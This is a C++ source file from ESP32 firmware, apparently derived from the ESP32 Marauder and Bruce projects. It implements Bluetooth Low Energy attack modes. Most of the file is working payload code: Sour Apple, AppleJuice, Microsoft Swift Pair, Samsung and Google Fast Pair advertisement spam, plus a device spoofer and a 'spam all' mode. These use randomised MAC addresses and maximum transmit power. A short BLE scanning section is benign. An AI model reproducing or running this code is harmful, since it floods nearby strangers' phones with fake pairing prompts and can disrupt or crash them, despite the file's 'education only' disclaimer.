#include "bleheader.h"

/*
    * ble.cpp (Based ESP32 Marauder By @justcallmekoko, Bruce By @pr3y)
    * /!\ WARNING: All Code I Wrote In This Is For Education Purpose ONLY! /!\
    * /!\        I NOT RESPONSIBLE ANY DAMAGE USER CAUSE IN PUBLIC         /!\
    * Author: Shine Nagumo @Ohminecraft (Xun Anh Nguyen)
    * Licensed under the MIT License.
*/

NimBLEAdvertising *pAdvertising;
NimBLEServer *pServer;
NimBLEScan *pBLEScan;


LinkedList<BLEScanResult>* blescanres;
bool bleScanRedraw = false;
bool bleAnalyzerMode = false;
uint8_t spooferDeviceIndex = -1;
uint8_t spooferConnectableModeIndex = -1;
uint8_t spooferDiscoverableModeIndex = -1;

BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
{
    NimBLEAdvertisementData AdvData = NimBLEAdvertisementData();

    uint8_t* AdvData_Raw = nullptr;
    uint8_t i = 0;
    //uint8_t dataSize = 0;

    switch (type)
    {
        //ESP32 Sour Apple by RapierXbox
        //Exploit by ECTO-1A
        case SourApple: {
            AdvData_Raw = new uint8_t[17];

            AdvData_Raw[i++] = 17 - 1;    // Packet Length
            AdvData_Raw[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
            AdvData_Raw[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
            AdvData_Raw[i++] = 0x00;        // ...
            AdvData_Raw[i++] = 0x0F;  // Type
            AdvData_Raw[i++] = 0x05;                        // Length
            AdvData_Raw[i++] = 0xC1;                        // Action Flags
            const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
            AdvData_Raw[i++] = types[rand() % sizeof(types)];  // Action Type
            esp_fill_random(&AdvData_Raw[i], 3); // Authentication Tag
            i += 3;   
            AdvData_Raw[i++] = 0x00;  // ???
            AdvData_Raw[i++] = 0x00;  // ???
            AdvData_Raw[i++] =  0x10;  // Type ???
            esp_fill_random(&AdvData_Raw[i], 3);

            AdvData.addData(AdvData_Raw, 17);
            break;
        }

        case AppleJuice: {  // https://github.com/pr3y/Bruce/blob/main/src/modules/ble/ble_spam.cpp
            int randdevice = random(2);
            if (randdevice == 0) {
                uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[random() % sizeof(IOS1)],
                                      0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                                      0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                                      0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
                AdvData.addData(packet, 31);
            } else if (randdevice == 1) {
                uint8_t packet[23] = {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a,
                                      0x00, 0x00, 0x00, 0x0f, 0x05, 0xc1, IOS2[random() % sizeof(IOS2)],
                                      0x60, 0x4c, 0x95, 0x00, 0x00, 0x10, 0x00,
                                      0x00, 0x00};
                AdvData.addData(packet, 23);
            }
            break;
        }
        
        case Microsoft: {
            String Name = generateRandomName();

            uint8_t name_len = Name.length();

            AdvData_Raw = new uint8_t[7 + name_len];

            AdvData_Raw[i++] = 7 + name_len - 1;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x06;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x80;
            memcpy(&AdvData_Raw[i], Name.c_str(), name_len);
            i += name_len;
            AdvData.addData(AdvData_Raw, 7 + name_len);
            break;
        }

        case Samsung: {
            AdvData_Raw = new uint8_t[15];

            uint8_t model = watch_models[rand() % 25].value;
            
            AdvData_Raw[i++] = 14; // Size
            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
            AdvData_Raw[i++] = 0x75; // Company ID (Samsung Electronics Co. Ltd.)
            AdvData_Raw[i++] = 0x00; // ...
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x02;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0x01;
            AdvData_Raw[i++] = 0xFF;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x00;
            AdvData_Raw[i++] = 0x43;
            AdvData_Raw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
            AdvData.addData(AdvData_Raw, 15);
            break;
        }

        case Google: {
            const uint32_t model = android_models[rand() % android_models_count].value; // Action Type
            AdvData_Raw = new uint8_t[14];
            AdvData_Raw[i++] = 3;
            AdvData_Raw[i++] = 0x03;
            AdvData_Raw[i++] = 0x2C; // Fast Pair ID
            AdvData_Raw[i++] = 0xFE;

            AdvData_Raw[i++] = 6;
            AdvData_Raw[i++] = 0x16;
            AdvData_Raw[i++] = 0x2C; // Fast Pair ID
            AdvData_Raw[i++] = 0xFE;
            AdvData_Raw[i++] = (uint8_t)((model >> 0x10) & 0xFF); // Smart Controller Model ID
            AdvData_Raw[i++] = (uint8_t)((model >> 0x08) & 0xFF);
            AdvData_Raw[i++] = (uint8_t)((model >> 0x00) & 0xFF);

            AdvData_Raw[i++] = 2;
            AdvData_Raw[i++] = 0x0A;
            AdvData_Raw[i++] = (rand() % 120) - 100; // -100 to +20 dBm

            AdvData.addData(AdvData_Raw, 14);
            break;
        }
        default: {
            Serial.println("[WARN] Choose Company Type!");
            return AdvData; // Return empty data for default case
        }
    }

    // Clean up allocated memory
    delete[] AdvData_Raw;


    return AdvData;
    //// https://github.com/Spooks4576
}

void BLEModules::main()
{
    blescanres = new LinkedList<BLEScanResult>();
      
    // Initialize BLE
    NimBLEDevice::setScanFilterMode(CONFIG_BTDM_SCAN_DUPL_TYPE_DEVICE);
    NimBLEDevice::setScanDuplicateCacheSize(200);
    NimBLEDevice::init("");
    NimBLEDevice::setPower(MAX_TX_POWER);
    pBLEScan = NimBLEDevice::getScan();
    ble_initialized = true;
    Serial.println("[INFO] Successfully Initialized BLE Module");

    this->ShutdownBLE();
}

bool BLEModules::ShutdownBLE()
{
    if(ble_initialized) {
        if (pAdvertising->isAdvertising()) // This stupid things is cause continuous crash
            pAdvertising->stop();
        if (pBLEScan->isScanning()) {
            pBLEScan->stop();
            pBLEScan->clearResults();
        }
        // Deinitialize BLE
        vTaskDelay(10 / portTICK_PERIOD_MS); // need delay to prevent crash
        NimBLEDevice::deinit();
        ble_initialized = false;
        Serial.println("[INFO] Shutting down BLE Module Successfully");
        return true;
    }
    return false;
}

void BLEModules::StartMode(BLEScanState mode) {
    if (mode == BLE_SCAN_OFF) {
        if (ble_initialized) {
            this->ShutdownBLE();
        }
        if (bleAnalyzerMode) bleAnalyzerMode = false;
    } else if (mode == BLE_SCAN_DEVICE) {
        bleScan();
    } else if (mode == BLE_SCAN_ANALYZER) {
        bleAnalyzerMode = true;
        bleScan();
    } else if (mode == BLE_ATTACK_SPOOFER_APPLE)
        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_APPLE, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
    else if (mode == BLE_ATTACK_SPOOFER_SAMSUNG)
        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_SAMSUNG, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
    else if (mode == BLE_ATTACK_SPOOFER_GOOGLE)
        startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_GOOGLE, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
    else if (mode == BLE_ATTACK_EXPLOIT_SOUR_APPLE) 
        executeSwiftpair(SourApple);
    else if (mode == BLE_ATTACK_EXPLOIT_APPLE_JUICE) 
        executeSwiftpair(AppleJuice);
    else if (mode == BLE_ATTACK_EXPLOIT_MICROSOFT)
        executeSwiftpair(Microsoft);
    else if (mode == BLE_ATTACK_EXPLOIT_SAMSUNG)
        executeSwiftpair(Samsung);
    else if (mode == BLE_ATTACK_EXPLOIT_GOOGLE)
        executeSwiftpair(Google);
    else if (mode == BLE_ATTACK_EXPLOIT_SPAM_ALL) {
        executeSwiftpair(SourApple, true);
        executeSwiftpair(AppleJuice, true);
        executeSwiftpair(Microsoft, true);
        executeSwiftpair(Samsung, true);
        executeSwiftpair(Google, true);
    }
    else if (mode == BLE_ATTACK_SPOOFER_INIT)
        initSpoofer();
    else if (mode == BLE_ATTACK_EXPLOIT_INIT)
        initSpam(); // Initialize BLE for exploit attacks
    else if (mode == BLE_ATTACK_SPOOFER_STOP)
        stopSpoofer();
    else {
        Serial.println("[ERROR] Invalid BLE Scan Mode Selected");
    }
}

BLEAdvertisementData BLEModules::selectSpooferDevices(uint8_t device_type, uint8_t device_brand, uint8_t conn_mode, uint8_t disc_mode) {
    BLEAdvertisementData AdvData = BLEAdvertisementData();
    if (device_brand == BLE_SPOOFER_DEVICE_BRAND_APPLE) {
        Serial.println("[INFO] BLE Apple Spoofer Starting");
        uint8_t packet[31] = {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, IOS1[(int)device_type],
                              0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                              0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00,
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
       AdvData.addData(packet, 31);
    } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_SAMSUNG) {
        Serial.println("[INFO] BLE Samsung Spoofer Starting");
        uint8_t model = watch_models[(int)device_type].value;
        uint8_t AdvData_Raw[15] = {0x0E, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 
                                   0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43,
                                   (uint8_t)((model >> 0x00) & 0xFF)};
        AdvData.addData(AdvData_Raw, 15);
    } else if (device_brand == BLE_SPOOFER_DEVICE_BRAND_GOOGLE) {
        Serial.println("[INFO] BLE Google Spoofer Starting");
        uint32_t model = android_models[(int)device_type].value; // Action Type
        uint8_t AdvData_Raw[14] = {0x03, 0x03, 0x2C, 0xFE, // First 3 data to announce Fast Pair
                                   0x06, 0x16, 0x2C, 0xFE,
                                   (uint8_t)((model >> 0x10) & 0xFF),
                                   (uint8_t)((model >> 0x08) & 0xFF),
                                   (uint8_t)((model >> 0x00) & 0xFF), // 6 more data to inform FastPair and device data
                                   0x02, 0x0A,
                                   (uint8_t)((rand() % 120) - 100)}; // 2 more data to inform RSSI data.
        AdvData.addData(AdvData_Raw, 14);
    }

    Serial.println("[INFO] BLE Spoofer Device Index: " + (String)device_type);
    String conn_mode_str = "";
    String disc_mode_str = "";
    
    switch(conn_mode) {
        case CONN_MODE_NON:
            pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
            conn_mode_str = "NON";
            break;
        case CONN_MODE_DIR:
            pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_DIR);
            conn_mode_str = "DIR";
            break;
        case CONN_MODE_UND:
            pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_UND);
            conn_mode_str = "UND";
            break;
    }
    switch(disc_mode) {
        case DISC_MODE_NON:
            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_NON);
            disc_mode_str = "NON";
            break;
        case DISC_MODE_LTD:
            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_LTD);
            disc_mode_str = "LTD";
            break;
        case DISC_MODE_GEN:
            pAdvertising->setDiscoverableMode(BLE_GAP_DISC_MODE_GEN);
            disc_mode_str = "GEN";
            break;
    }

    Serial.println("[INFO] BLE Spoofer Connectable Mode: " + conn_mode_str);
    Serial.println("[INFO] BLE Spoofer Discoverable Mode: " + disc_mode_str);

    return AdvData;
}

void BLEModules::initSpoofer() {
    if (ble_initialized) {
        Serial.println("[INFO] BLE already initialized, skipping...");
        return;
    }
    uint8_t null_addr[6] = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    esp_ble_gap_set_rand_addr(null_addr);

    Serial.println("[INFO] BLE Spoofer Initialized Successfully!");
}

void BLEModules::startSpoofer(uint8_t device_type, uint8_t device_brand, uint8_t conn_mode, uint8_t disc_mode) {
    uint8_t dummy_addr[6] = {0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
    }
    if (!ble_initialized) {
        uint8_t macAddr[6];
        generateRandomMac(macAddr);
        esp_base_mac_addr_set(macAddr);
        esp_ble_gap_set_rand_addr((uint8_t*)dummy_addr);
        NimBLEDevice::init(espatsettings.bleName.c_str());
        NimBLEDevice::setPower(MAX_TX_POWER);
        NimBLEServer *pServer = BLEDevice::createServer();
        pAdvertising = pServer->getAdvertising();
        ble_initialized = true;
    }
    NimBLEAdvertisementData oAdvertisementData = selectSpooferDevices(device_type, device_brand, conn_mode, disc_mode);
    pAdvertising->addServiceUUID(SERVICE_UUID);
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->setMinInterval(0x20); // 32.5ms
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setPreferredParams(0x20, 0x20);
    pAdvertising->start();
    Serial.println("[INFO] Starting Spoofer Advertisement");
}

void BLEModules::stopSpoofer() {
    if (ble_initialized && pAdvertising->isAdvertising()) {
        vTaskDelay(50 / portTICK_PERIOD_MS); // Wait for advertisement to stop
        pAdvertising->stop();
        vTaskDelay(10 / portTICK_PERIOD_MS); // Wait for stop to complete
        BLEDevice::deinit();
        ble_initialized = false;
    }
    Serial.println("[INFO] Stopping Spoofer Advertisement");
}

void BLEModules::initSpam() {
    uint8_t null_addr[6] = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
    esp_ble_gap_set_rand_addr(null_addr);

    ble_initialized = true;
    Serial.println("[INFO] BLE Spam Initialized Successfully!");
}

void BLEModules::executeSwiftpair(EBLEPayloadType type, bool forspamall)
{
    uint8_t macAddr[6];
    generateRandomMac(macAddr);
    esp_base_mac_addr_set(macAddr);
    uint8_t dummy_addr[6] = {0x00};
      for (int i = 0; i < 6; i++) {
        dummy_addr[i] = random(256);
        if (i == 0) dummy_addr[i] |= 0xC0; // Random non-resolvable
    }
    esp_ble_gap_set_rand_addr(dummy_addr);
    NimBLEDevice::init("");
    NimBLEDevice::setPower(MAX_TX_POWER, NimBLETxPowerType::Advertise);
    NimBLEServer *pServer = NimBLEDevice::createServer();
    pAdvertising = pServer->getAdvertising();
    vTaskDelay(10 / portTICK_PERIOD_MS);
    NimBLEAdvertisementData advertisementData = GetAdvertismentData(type);
    pAdvertising->addServiceUUID(SERVICE_UUID);
    pAdvertising->setAdvertisementData(advertisementData);
    if (random(2) == 0) pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_NON);
    else pAdvertising->setConnectableMode(BLE_GAP_CONN_MODE_UND);
    pAdvertising->setDiscoverableMode(random(3));
    pAdvertising->setMinInterval(0x20);
    pAdvertising->setMaxInterval(0x20);
    pAdvertising->setPreferredParams(0x20, 0x20);
    pAdvertising->start();
    if (!forspamall) {
        if (type == AppleJuice) vTaskDelay(espatsettings.applejuiceSpamDelay / portTICK_PERIOD_MS);
        else if (type == SourApple) vTaskDelay(espatsettings.sourappleSpamDelay / portTICK_PERIOD_MS);
        else vTaskDelay(espatsettings.swiftpairSpamDelay / portTICK_PERIOD_MS);
    } else {
        vTaskDelay(espatsettings.spamAllDelay / portTICK_PERIOD_MS);
    }
    pAdvertising->stop();
    vTaskDelay(10 / portTICK_PERIOD_MS);
    NimBLEDevice::deinit();
}

class BLEScanDeviceCallbacks: public NimBLEScanCallbacks {
    void onResult(const NimBLEAdvertisedDevice *advertisedDevice) override {
        extern BLEModules ble;

        if (!bleAnalyzerMode) {
            bleScanRedraw = true;
            BLEScanResult bleres;
            String ble_name;
            ble_name = advertisedDevice->getName().c_str();
            if (ble_name.isEmpty()) bleres.name = "<no name>";
            else bleres.name = ble_name;
            bleres.rssi = advertisedDevice->getRSSI();
            bleres.addr = advertisedDevice->getAddress();
            if (!low_memory_warning)
                blescanres->add(bleres);
            String add_to_buffer;
            if (!low_memory_warning) {
                if (ble_name.isEmpty()) add_to_buffer = String(bleres.addr.toString().c_str());
                else add_to_buffer = ble_name;
            } else add_to_buffer = String("Low Mem! Ignore!");
            display_buffer->add(add_to_buffer);
            if (!low_memory_warning) Serial.println("[INFO] Added: " + bleres.name + " (Addr: " + String(bleres.addr.toString().c_str()) + ")" + " (RSSI: " + String(bleres.rssi) + ")");
            else Serial.println("[INFO] Low Memory Warning! Ignore: " + bleres.name + " (Addr: " + String(bleres.addr.toString().c_str()) + ")" + " (RSSI: " + String(bleres.rssi) + ")");
        } else {
            for (int i = 0; i < 5; i++) ble.ble_analyzer_value++;

            if (ble.ble_analyzer_frames_recvd < 254) 
                ble.ble_analyzer_frames_recvd++;

            if (ble.ble_analyzer_frames_recvd >= 100) {
                ble.ble_analyzer_rssi = advertisedDevice->getRSSI();
                if (advertisedDevice->getName().length() != 0) {
                    ble.ble_analyzer_device = advertisedDevice->getName().c_str();
                } else {
                    ble.ble_analyzer_device = advertisedDevice->getAddress().toString().c_str();
                }
                ble.ble_analyzer_frames_recvd = 0;
            }
        }
        
    }
};

void BLEModules::bleScan() {
    delete blescanres;
    blescanres = new LinkedList<BLEScanResult>();
    NimBLEDevice::init(espatsettings.bleName.c_str());
    ble_initialized = true;
    pBLEScan = BLEDevice::getScan();
    if (!bleAnalyzerMode)
    pBLEScan->setScanCallbacks(new BLEScanDeviceCallbacks(), false);
    else
    pBLEScan->setScanCallbacks(new BLEScanDeviceCallbacks(), true);

    pBLEScan->setActiveScan(true);
    pBLEScan->setInterval(100);
    pBLEScan->setWindow(99);
    pBLEScan->setMaxResults(0);

    vTaskDelay(100 / portTICK_PERIOD_MS);

    Serial.println("[INFO] Starting BLE Scan");
    pBLEScan->start(0, false, true);
}

